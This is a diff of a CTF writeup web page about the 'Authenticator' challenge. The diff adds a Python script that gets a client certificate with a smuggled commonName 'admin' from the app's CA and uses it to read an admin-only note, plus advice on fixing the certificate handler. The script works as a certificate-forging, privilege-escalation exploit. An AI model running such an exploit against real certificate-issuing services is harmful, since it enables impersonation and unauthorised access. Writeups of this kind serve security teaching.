@@ -248,8 +248,10 @@ span.linenos.special { color: #e6edf3; background-color: #6e7681; padding-left: 
 .codehilite .vm { color: #79C0FF } /* Name.Variable.Magic */
 .codehilite .il { color: #A5D6FF } /* Literal.Number.Integer.Long */
 pre .codehilite, .codehilite pre{background:transparent;border:0;padding:0;margin:0}
-</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web" class="on">Web</a><a href="../index.html#crypto">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#web">Web</a></div><h1>Authenticator — CSR CN smuggling</h1><p class="tags"><span class="tag">x509</span><span class="tag">csr</span><span class="tag">pkix</span><span class="tag">extra-names</span><span class="tag">mtls</span></p><div class="artmeta"><span>authenticator.is-course.ru</span><span>1 min read</span><span>208 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
+</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web" class="on">Web</a><a href="../index.html#crypto">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#web">Web</a></div><h1>Authenticator — CSR CN smuggling</h1><p class="tags"><span class="tag">x509</span><span class="tag">csr</span><span class="tag">pkix</span><span class="tag">extra-names</span><span class="tag">mtls</span></p><div class="artmeta"><span>authenticator.is-course.ru</span><span>2 min read</span><span>350 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
 <li><a href="#the-bug">The bug</a></li>
+<li><a href="#reproducing-it-verified-live">Reproducing it (verified live)</a></li>
+<li><a href="#what-the-handler-should-have-done">What the handler should have done</a></li>
 <li><a href="#fix">Fix</a></li></ol></nav><h1 id="authenticator">Authenticator</h1>
 <h2 id="recon" id="recon">Recon</h2>
 <p>Users register, then request a client certificate from the app's own CA (<code>POST /api/create_certificate</code>
@@ -271,6 +273,41 @@ set.</p>
 as admin, exposing the SECURE note:</p>
 <p><code>YDS{…redacted…}</code>
 (the flag literally contains two U+FEFF zero-width characters — copy it byte-exact).</p>
+<h2 id="reproducing-it-verified-live" id="reproducing-it-verified-live">Reproducing it (verified live)</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span>
+
+<span class="n">B</span> <span class="o">=</span> <span class="s2">"https://authenticator.is-course.ru"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">u</span> <span class="o">=</span> <span class="s2">"attacker</span><span class="si">%d</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">"/register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span> <span class="n">u</span><span class="p">,</span> <span class="s2">"password"</span><span class="p">:</span> <span class="s2">"Passw0rd!xyz"</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">"/login"</span><span class="p">,</span>    <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span> <span class="n">u</span><span class="p">,</span> <span class="s2">"password"</span><span class="p">:</span> <span class="s2">"Passw0rd!xyz"</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+<span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"key"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"algo"</span><span class="p">:</span> <span class="s2">"rsa"</span><span class="p">,</span> <span class="s2">"size"</span><span class="p">:</span> <span class="mi">2048</span><span class="p">},</span>
+        <span class="s2">"names"</span><span class="p">:</span> <span class="p">[{</span><span class="s2">"OID"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"2.5.4.3"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">}}]}</span>          <span class="c1"># 2.5.4.3 = commonName</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">"/api/create_certificate"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+<span class="nb">open</span><span class="p">(</span><span class="s2">"cli.crt"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s2">"certificate"</span><span class="p">])</span>
+<span class="nb">open</span><span class="p">(</span><span class="s2">"cli.key"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s2">"private_key"</span><span class="p">])</span>
+
+<span class="c1"># the CA is trusted by nginx, and the CN is the authorisation check</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">"/profile"</span><span class="p">,</span> <span class="n">cert</span><span class="o">=</span><span class="p">(</span><span class="s2">"cli.crt"</span><span class="p">,</span> <span class="s2">"cli.key"</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>      <span class="c1"># SECURE note with the flag</span>
+</code></pre></div>
+
+<p>The issued certificate really is <code>CN=admin, issuer=CN=RootCA</code> — you can see <code>"admin"</code> in the DER
+(<code>...EwVhZG1pbj...</code>) before you even present it. The flag contains <strong>two U+FEFF zero-width characters</strong>
+(directly before <code>task_</code> and at the very end), so copy it byte-exact — a "wrong flag" rejection is
+almost certainly a stripped/BOM-normalised copy.</p>
+<h2 id="what-the-handler-should-have-done" id="what-the-handler-should-have-done">What the handler should have done</h2>
+<ol>
+<li>Build the subject <strong>only</strong> from server-side data (<code>pkix.Name{CommonName: username}</code>), never from a
+   client-supplied <code>names</code> array.</li>
+<li>After issuance, re-parse the certificate and assert <code>subject.CommonName == username</code> and that the
+   subject has exactly one CN (Go's <code>pkix</code> allows duplicates via <code>ExtraNames</code>, and
+   <code>FillFromRDNSequence</code> silently keeps the last one).</li>
+<li>Better: stop using the certificate subject as an identity token — use a per-user key and check
+   revocation/mapping server-side.</li>
+</ol>
 <h2 id="fix" id="fix">Fix</h2>
 <p>Do not accept arbitrary <code>OID</code> maps from clients; build the subject from server-side data only, and
 validate the parsed certificate subject after issuance.</p><nav class="pager"><span></span><a class="next" href="cats-open.html"><div class="lbl">next &rarr;</div><div class="ttl">cats — anatomy of an admin bot that refuses to cooperate</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
